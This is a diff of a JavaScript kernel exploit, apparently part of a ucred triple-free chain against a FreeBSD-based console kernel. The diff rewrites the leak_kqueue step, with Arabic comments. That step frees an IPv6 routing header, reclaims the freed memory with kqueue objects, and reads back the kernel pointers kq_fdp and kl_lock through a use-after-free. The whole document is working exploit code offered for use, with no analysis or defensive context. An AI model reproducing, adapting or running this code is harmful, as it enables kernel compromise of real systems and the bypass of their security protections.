@@ -1651,93 +1651,64 @@ function trigger_ucred_triplefree() {
   return true;
 }
 function leak_kqueue() {
-  var kq        = new BigInt(0);
+  debug('Leaking kqueue...');
+
+  // نحرر triplets[1] عشان نستخدمه في التسريب
+  free_rthdr(ipv6_socks[triplets[1]]);
+
+  var kq = new BigInt(0);
   var magic_val = new BigInt(0x0, 0x1430000);
   var magic_add = leak_rthdr.add(0x08);
-
-  var count     = 0;
-  var MAX_KQ    = 4000;
-  var INNER_MAX = 40;
-
-  var success   = false;
+  var count = 0;
+  var MAX_KQ = 5000;
 
   while (count < MAX_KQ) {
     count++;
 
-    // 1) إنشاء kqueue
     kq = kqueue();
     if (kq.eq(BigInt_Error)) {
+      log('leak_kqueue: kqueue() failed');
       return false;
     }
 
-    // 2) تصفير buffer قبل أول get_rthdr
+    // تصفير جزء من leak_rthdr قبل القراءة (لتفادي بقايا قديمة)
     write64(magic_add, 0);
     write64(leak_rthdr.add(0x98), 0);
 
-    // 3) تهوية بسيطة قبل free
-    sched_yield();
+    get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x100);
 
-    // 4) تحرير rthdr لفتح نافذة reuse
-    free_rthdr(ipv6_socks[triplets[1]]);
+    var magic = read64(magic_add);
+    var fdp   = read64(leak_rthdr.add(0x98));
 
-    var inner_tries = 0;
-
-    while (inner_tries < INNER_MAX) {
-
-      // 5) دبق خفيف
-      for (var d = 0; d < 5; d++) { //delay 
-      }
-
-      // 6) محاولة قراءة rthdr بعد free
-      get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x100);
-
-      // 7) قراءة magic + fdp
-      var magic = read64(magic_add);
-      var fdp   = read64(leak_rthdr.add(0x98));
-
-      // 8) شرط النجاح
-      if (magic.eq(magic_val) && !fdp.eq(0)) {
-        success = true;
-        break;
-      }
-
-      // 9) تصفير متناغم بعد كل محاولة فاشلة
-      write64(magic_add, 0);
-      write64(leak_rthdr.add(0x98), 0);
-
-      // 10) yield دوري لمنع التجميد
-      if ((inner_tries % 10) === 0) {
-        sched_yield();
-      }
-
-      inner_tries++;
+    if (magic.eq(magic_val) && !fdp.eq(0)) {
+      break;
     }
 
-    // 11) نجاح leak
-    if (success) {
-      kl_lock = read64(leak_rthdr.add(0x60));
-      kq_fdp  = read64(leak_rthdr.add(0x98));
-
-      if (kq_fdp.eq(0)) {
-        close(kq);
-        return false;
-      }
-
-      close(kq);
-
-      // إعادة ضبط triplet بعد نجاح leak
-      triplets[1] = find_triplet(triplets[0], triplets[2]);
-
-      return true;
-    }
-
-    // 12) فشل في هذه الدورة
     close(kq);
     sched_yield();
   }
 
-  // 13) استنفاد المحاولات
-  return false;
+  if (count >= MAX_KQ) {
+    log('leak_kqueue: exceeded MAX_KQ iterations');
+    return false;
+  }
+
+  kl_lock = read64(leak_rthdr.add(0x60));
+  kq_fdp  = read64(leak_rthdr.add(0x98));
+
+  if (kq_fdp.eq(0)) {
+    log('Failed to leak kqueue_fdp');
+    return false;
+  }
+
+  debug('kq_fdp: ' + hex(kq_fdp) + ' kl_lock: ' + hex(kl_lock));
+
+  close(kq);
+
+  // إعادة بناء triplets[1] بعد ما استخدمناه في free
+  triplets[1] = find_triplet(triplets[0], triplets[2]);
+
+  return true;
 }
 
 function leak_kqueue_safe() {
